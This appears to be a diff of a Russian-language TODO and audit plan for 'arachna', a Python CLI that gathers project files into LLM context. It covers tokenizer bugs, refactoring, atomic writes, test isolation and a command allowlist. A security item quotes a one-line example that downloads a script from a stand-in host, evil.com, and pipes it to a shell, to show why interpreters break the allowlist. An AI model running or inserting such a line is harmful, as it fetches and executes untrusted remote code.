@@ -1,91 +1,80 @@
 # TODO
 
-## Текущий цикл — 2026-05-25, источник: аудит v0.5.0
+## Текущий цикл — 2026-05-27, источник: аудит v0.7.0 pre-release
 
-### [HIGH] src/arachna/cache.py — состояние гонки в инкрементальном режиме
-- [x] Источник: Архитектура / HIGH + Аудит H-01
-- [x] Версия: v0.6.1
-- [x] Суть: save_cache делает write_text без атомарности — краш во время записи оставит повреждённый JSON. Между get_changed_files и update_cache файл может измениться.
-- [x] Решение: атомарная запись через tempfile + os.replace; рассмотреть хэш содержимого вместо mtime для детекта изменений.
+### [CRITICAL] src/arachna/runner.py — убрать интерпретаторы из _ALLOWED_COMMANDS
+- Источник: Безопасность / CRITICAL + Аудит RCE
+- Версия: v0.7.0
+- Суть: _ALLOWED_COMMANDS содержит python, node, ruby, perl, php. Каждый из них выполняет произвольный код: python -c "import os; os.system('curl evil.com | sh')". Блокировка _BLOCKED_PATTERNS тривиально обходится. Это имитация безопасности.
+- Решение: убрать 5 интерпретаторов из allowlist. Оставить строго read-only утилиты: git log, tree, cat, grep, find, ls, wc, sort, uniq, head, tail, cut, tr, sed, awk, date, env, pwd, diff. Интерпретаторы — только через --allow-scripts с явным подтверждением.
 
-### [HIGH] src/arachna/gitignore.py — ограничение размера .gitignore
-- [x] Источник: Безопасность / MEDIUM + Аудит M-01
-- [x] Версия: v0.6.1
-- [x] Суть: load_gitignore_patterns читает все .gitignore рекурсивно без ограничения размера → DoS через исчерпание памяти. Также жёстко закодированный список исключаемых директорий (venv, node_modules, __pycache__, .) неполон — отсутствуют .tox, .mypy_cache, .pytest_cache.
-- [x] Решение: добавить проверку file size до чтения (пропускать > 100 КБ); расширить список исключаемых директорий (EXCLUDED_DIRS) и вынести его в константу для переиспользования в config.py.
+### [HIGH] src/arachna/splitter.py — splitter игнорирует кастомный токенизатор (production-баг)
+- Источник: Архитектура / HIGH + Аудит H-01
+- Версия: v0.7.0
+- Суть: splitter.py импортирует count_tokens напрямую из tokenizer.py — всегда дефолтный 4 chars/token. gatherer.py использует глобальный _TOKENIZE (можно заменить через set_tokenizer). При кастомном токенизаторе сбор секций считает токены точно, а разбивка на части — грубо. Части превышают max_tokens.
+- Решение: пробросить tokenizer параметром в split(), _build_parts(), _handle_single(). Временно использовать get_tokenizer() из gatherer до полного рефакторинга _TOKENIZE.
+- Путь бага: config → tokenizer="tiktoken:cl100k_base" → collector.set_tokenizer() → gatherer._TOKENIZE(section) ✓ → splitter.count_tokens(section) ✗
 
-### [MEDIUM] src/arachna/formatter.py — проверка размера бинарных файлов до read_text()
-- [x] Источник: Безопасность / MEDIUM
-- [x] Версия: v0.6.1
-- [x] Суть: format_file_section вызывает read_text() до проверки _is_binary_allowed. Большой бинарный файл вызывает MemoryError.
-- [x] Решение: перенести проверку размера (и расширения) до попытки read_text().
+### [HIGH] src/arachna/gatherer.py — устранить глобальное состояние _TOKENIZE
+- Источник: Архитектура / HIGH + Аудит H-02 + M-02 (из v0.5.0)
+- Версия: v0.7.0
+- Суть: set_tokenizer() меняет модульную переменную _TOKENIZE — глобальный сайд-эффект. Тесты вынуждены патчить. Как библиотека — несколько вызовов с разными токенизаторами мешают друг другу. _collect_named_sections — God function на 47 строк (pre_commands + директории + files).
+- Решение: dependency injection — передавать tokenizer параметром в _collect_named_sections, gather_files, dry_run, split. _TOKENIZE оставить deprecated для обратной совместимости. Декомпозировать _collect_named_sections на _collect_pre_commands, _scan_directories, _collect_specific_files.
 
-### [LOW] src/arachna/splitter.py — вынести константу CHARS_PER_TOKEN
-- [ ] Источник: Архитектура / LOW
-- [ ] Версия: v0.6.1
-- [ ] Суть: max_chars = max_tokens * 4 в splitter.py неявно связано с константой 4 в tokenizer.py. Изменение tokenizer сломает truncation-logic.
-- [ ] Решение: вынести CHARS_PER_TOKEN = 4 в tokenizer.py, импортировать в splitter.py.
+### [HIGH] src/arachna/__main__.py — рефакторинг _cmd_all и _cmd_single (не завершён)
+- Источник: Архитектура / HIGH + Аудит H-03
+- Версия: v0.7.0
+- Суть: _cmd_all (строки 171-204) и _cmd_single (строки 207-218) — дублирование логики get_profile → compress → format → collect. _cmd_all не поддерживает --incremental. В TODO v0.7.0 задача помечена [x], но код не изменён.
+- Решение: вынести общую логику в _run_profile() (уже существует, но не используется для объединения). _cmd_all должен итерировать профили через _run_profile, _cmd_single — вызывать один раз. Поддержать --incremental в обоих случаях.
 
-### [HIGH] src/arachna/runner.py — sandbox-валидация команд и аудит-лог
-- [x] Источник: Безопасность / HIGH + Аудит H-02
-- [x] Версия: v0.7.0
-- [x] Суть: shell=True для команд из конфига — риск RCE через вредоносный .arachna.json. Отсутствует журнал исполненных команд — невозможен аудит инцидента.
-- [x] Решение: добавить валидацию команд (allowlist безопасных утилит, запрет curl/wget и т.п.) или запрос подтверждения у пользователя при первом запуске профиля; добавить logging выполняемых команд (--log-commands или всегда в verbose); возможно — хэш-подпись доверенных конфигов.
+### [HIGH] src/arachna/collector.py — атомарная запись манифеста
+- Источник: Архитектура / HIGH + Аудит H-04
+- Версия: v0.7.0
+- Суть: save_manifest (строка 40) делает write_text без атомарности — краш оставит повреждённый JSON. _cmd_single делает clean_manifest → collect → save_manifest без блокировок. В отличие от cache.py, где атомарная запись реализована правильно.
+- Решение: реализовать save_manifest через tempfile + os.replace (как в save_cache). Для блокировок рассмотреть filelock при параллельных запусках.
 
-### [HIGH] src/arachna/__main__.py — рефакторинг main() и устранение дублирования _cmd_all/_cmd_single
-- [x] Источник: Архитектура / HIGH + MEDIUM
-- [x] Версия: v0.7.0
-- [x] Суть: main() нарушает SRP (84 строки); _cmd_all и _cmd_single дублируют логику get_profile + compress + format + collect.
-- [x] Решение: вынести роутинг команд в отдельный dispatcher; объединить _cmd_all и _cmd_single через общую _run_profile(); добавить обработчик --version.
+### [MEDIUM] src/arachna/splitter.py — вынести CHARS_PER_TOKEN и добавить флаг truncated
+- Источник: Архитектура / LOW + MEDIUM + Аудит M-03
+- Версия: v0.7.0
+- Суть: _handle_single использует max_chars = max_tokens * 4 — магическая константа, неявно связанная с tokenizer.py. При кастомном токенизаторе усечение некорректно. Нет информации о потере данных — вызывающий код не знает что контент обрезан.
+- Решение: вынести CHARS_PER_TOKEN = 4 в tokenizer.py. В _handle_single пробросить tokenizer и использовать его для усечения. Возвращать (text, was_truncated, original_tokens) или добавить маркер truncated с информацией о потерянных токенах.
 
-### [MEDIUM] src/arachna/gatherer.py — устранить глобальное состояние _TOKENIZE и декомпозировать _collect_named_sections
-- [ ] Источник: Архитектура / MEDIUM + Тесты / MEDIUM + Аудит M-02
-- [ ] Версия: v0.7.0
-- [ ] Суть: set_tokenizer меняет модульную переменную — побочный эффект для тестов и риск при использовании как библиотеки; _collect_named_sections — God function на 47 строк; splitter.py импортирует count_tokens напрямую, минуя глобальный state — несогласованность: splitter всегда использует дефолтный токенизатор.
-- [ ] Решение: передавать tokenizer через параметры (dependency injection) во все модули; разбить _collect_named_sections на _collect_pre_commands, _scan_directories, _read_files; пробросить tokenizer в splitter.
-
-### [MEDIUM] src/arachna/formatter.py — вынести импорт json на уровень модуля
-- [x] Источник: Архитектура / MEDIUM
-- [x] Версия: v0.7.0
-- [x] Суть: import json as _json внутри _format_json и _format_binary — индикатор неоптимальной организации.
-- [x] Решение: вынести import json в начало файла; рассмотреть выделение binary-форматтера в отдельный модуль formatter_binary.py.
-
-### [MEDIUM] src/arachna/config.py — унифицировать exclude-паттерны с gitignore.py
-- [ ] Источник: Архитектура / LOW
-- [ ] Версия: v0.7.0
-- [ ] Суть: DEFAULT_EXCLUDE и gitignore.py дублируют исключения (venv, node_modules, __pycache__). Двойная фильтрация усложняет понимание.
-- [ ] Решение: вынести список "всегда исключаемых" директорий в константу EXCLUDED_DIRS, использовать в обоих модулях.
+### [MEDIUM] src/arachna/config.py — унифицировать EXCLUDED_DIRS с gitignore.py
+- Источник: Архитектура / LOW + Аудит L-01
+- Версия: v0.7.0
+- Суть: DEFAULT_EXCLUDE (config.py) и EXCLUDED_DIRS (gitignore.py) содержат пересекающиеся списки: venv, node_modules, __pycache__. При добавлении новой директории нужно править два файла.
+- Решение: вынести общий список в config.py как EXCLUDED_DIRS, импортировать в gitignore.py. Обновить оба модуля.
 
 ### [MEDIUM] src/arachna/renderer.py — вынести магические значения в константы
-- [ ] Источник: Архитектура / LOW
-- [ ] Версия: v0.7.0
-- [ ] Суть: порог 0.05 для <0.1%, строка "<0.1%" — магические значения без пояснения семантики.
-- [ ] Решение: вынести в именованные константы MIN_PCT_THRESHOLD, MIN_PCT_DISPLAY с документирующими комментариями.
+- Источник: Архитектура / LOW + Аудит L-02
+- Версия: v0.7.0
+- Суть: порог 0.05 для <0.1%, строка "<0.1%" — магические значения без документирующих комментариев.
+- Решение: MIN_PCT_THRESHOLD = 0.05, MIN_PCT_DISPLAY = "<0.1%" с комментариями.
 
-### [MEDIUM] src/arachna/collector.py — атомарная запись манифеста
-- [ ] Источник: Архитектура / HIGH + Аудит H-01
-- [ ] Версия: v0.7.0
-- [ ] Суть: save_manifest делает write_text без атомарности; _cmd_single вызывает clean_manifest → collect → save_manifest — три раздельных операции без блокировок, возможна гонка при параллельных запусках.
-- [ ] Решение: атомарная запись через tempfile + os.replace; добавить filelock для операций с манифестом.
+### [HIGH] tests/ — замена os.chdir на tmp_path/monkeypatch
+- Источник: Тестопригодность / HIGH + Аудит H-05
+- Версия: v0.7.0
+- Суть: 90% тестов делают os.chdir(tmpdir) — глобальное состояние процесса, pytest-xdist не работает. Тесты gatherer патчат pathlib.Path.cwd поверх os.chdir — избыточно. 180+ тестов идут последовательно.
+- Решение: перевести все тесты на tmp_path (pytest fixture) + monkeypatch.chdir. Удалить двойное патчение cwd. Тесты tokenizer изолировать от sys.path.
 
-### [MEDIUM] src/arachna/splitter.py — флаг truncated в _handle_single
-- [ ] Источник: Архитектура / Аудит M-03
-- [ ] Версия: v0.7.0
-- [ ] Суть: _handle_single обрезает текст необратимо, без признака truncated и без информации сколько контента потеряно. Вызывающий код не узнает что контент был обрезан.
-- [ ] Решение: возвращать (text, was_truncated) или добавить маркер в выходной текст с информацией о потерянных токенах; логировать truncation в collector.
+### [MEDIUM] tests/runner/test_run_command.py — замокать subprocess.run
+- Источник: Тестопригодность / MEDIUM + Аудит M-05
+- Версия: v0.7.0
+- Суть: тесты вызывают echo — работает на Unix, падает на Windows. Системные вызовы в unit-тестах.
+- Решение: замокать subprocess.run во всех тестах runner. Системные вызовы вынести в интеграционные тесты.
 
-### [MEDIUM] tests/ — заменить os.chdir на tmp_path/monkeypatch
-- [ ] Источник: Тесты / MEDIUM + Аудит M-04
-- [ ] Версия: v0.7.0
-- [ ] Суть: os.chdir в тестах делает невозможным параллельный запуск (pytest-xdist). Тесты collector, config, gatherer зависят от глобального состояния cwd. Одновременное использование os.chdir и patch('pathlib.Path.cwd') избыточно.
-- [ ] Решение: перевести тесты на tmp_path (pytest fixture) + monkeypatch.chdir; изолировать тесты tokenizer от глобального _TOKENIZE; удалить двойное патчение cwd.
+### [MEDIUM] tests/config/test_get_profile.py — изоляция от родительского .arachna.json
+- Источник: Тестопригодность / MEDIUM + Аудит M-06
+- Версия: v0.7.0
+- Суть: тесты ищут конфиг через find_config(), поднимаясь по дереву директорий. Если у разработчика есть .arachna.json в домашней директории — тесты упадут.
+- Решение: monkeypatch для подмены find_config или cwd на временную директорию.
 
 ### Отложено
 - src/arachna/completion.py — heredoc-тесты на shell-совместимость: требует запуска в реальной оболочке, не блокирует v0.7.0
-- tests/main/*.py — каскадные CLI-тесты: будут упрощены после рефакторинга main.py (v0.7.0)
-- tests/config/test_get_profile.py — изоляция от родительского .arachna.json: закроется после перехода на tmp_path в v0.7.0
-- src/arachna/cache.py — изолируемое имя файла кэша: требуется product-решение о хранении кэша в output_dir
-- tests/runner/test_run_command.py — зависимость от echo: критично только для Windows CI
+- src/arachna/runner.py — sandbox (контейнер/nsjail): требует product-решения до v1.0.0
+- src/arachna/collector.py — filelock для параллельных запусков: маловероятный сценарий для CLI, отложить до интеграции в CI/CD
+
+---
 
 ## v0.1.0 — MVP
 - [x] tokenizer, config, collector, gatherer, splitter, formatter, runner, CLI
@@ -132,24 +121,35 @@
 - [x] formatter: verbose skip reasons
 - [x] splitter: separator for xml/json
 - [x] Tests: cache, completion, init, formatter, incremental, manifest
-- [x] .arachna.json: "all" profile (32768 tokens)
 - [x] 175 tests, 90% coverage
 
-## v0.6.0 — Pluggable tokenizer
-- [x] load_tokenizer(spec) in tokenizer.py
-- [x] tokenizer field in profile (default: "default")
-- [x] Plumbed through collector → gatherer → splitter
-- [x] Tests for custom tokenizer plugin
+## v0.6.0 — Pluggable tokenizer (ВЫПУЩЕН, НО С БАГОМ)
+- [x] load_tokenizer(spec) в tokenizer.py
+- [x] tokenizer field в profile
+- [x] Plumbed через collector → gatherer
+- [ ] BUG: splitter напрямую импортирует count_tokens, игнорируя кастомный токенизатор
 - [x] 179 tests, 90% coverage
 
-## v0.7.0 — Additional tests
-- [ ] Coverage ≥ 95%
-- [ ] Integration tests for --format xml/json output
-- [ ] Edge cases: empty files, huge files, symlinks
+## v0.7.0 — Архитектура, безопасность, тестопригодность (текущий)
+- [ ] runner.py: убрать интерпретаторы из allowlist
+- [ ] splitter.py: пробросить токенизатор в split()
+- [ ] gatherer.py: убрать глобальный _TOKENIZE, DI
+- [ ] __main__.py: рефакторинг _cmd_all/_cmd_single
+- [ ] collector.py: атомарная запись манифеста
+- [ ] splitter.py: CHARS_PER_TOKEN + флаг truncated
+- [ ] config.py: унифицировать EXCLUDED_DIRS
+- [ ] renderer.py: константы MIN_PCT_*
+- [ ] tests/: tmp_path + monkeypatch
+- [ ] tests/runner/: замокать subprocess.run
 
 ## v1.0.0 — Public release
 - [ ] pip install arachna (publish to PyPI)
+- [ ] Sandbox для command (контейнер/nsjail или dry-run + подтверждение)
+- [ ] Кроссплатформенные тесты (Windows CI)
 - [ ] arachna install-hook (git post-commit)
+- [ ] Coverage ≥ 95%
 
 ## Backlog
 - [ ] CI/CD (GitHub Actions)
+- [ ] Интеграция в IDE (VS Code extension)
+- [ ] Web UI для визуального редактора профилей
